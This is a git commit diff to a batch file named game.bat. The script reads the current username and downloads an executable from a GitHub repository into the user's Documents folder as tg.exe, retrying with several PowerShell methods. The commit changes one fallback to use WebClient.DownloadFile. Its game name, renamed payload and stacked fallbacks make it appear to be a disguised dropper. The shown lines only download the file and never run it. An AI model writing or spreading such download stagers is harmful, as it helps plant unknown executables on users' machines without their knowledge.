b84c3b848fca972c1c5689597f05300ff78ded97
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-08 21:27:28 +0330

    Update game.bat

--- game.bat
+++ game.bat
@@ -4,7 +4,7 @@ for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"
 :download
 PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
 if ERRORLEVEL 1 (
-	PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
+	PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"
 	if ERRORLEVEL 1 ( 
 		PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
 	)
